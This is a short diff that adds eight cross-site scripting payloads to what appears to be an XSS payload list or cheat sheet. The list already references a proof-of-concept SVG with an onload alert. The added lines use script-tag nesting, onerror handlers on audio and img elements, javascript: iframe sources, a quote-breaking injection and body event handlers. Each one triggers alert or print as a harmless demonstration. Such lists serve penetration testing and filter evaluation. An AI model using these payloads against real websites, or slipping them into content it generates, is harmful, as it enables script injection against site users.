@@ -31,3 +31,11 @@
 https://brutelogic.com.br/poc.svg
 http://xss.rocks/scriptlet.html
 poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<script <script>>alert('Gotcha')</script>  
+<audio src/onerror=alert('Gotcha')>
+<iframe src=javascript:alert('Gotcha')>
+<iframe src="javascript:alert(Gotcha)">
+<img src=x onerror=alert(Gotcha)>
+';alert(gotcha); //
+<body onmouseover="print()">
+<body onclick=print()>
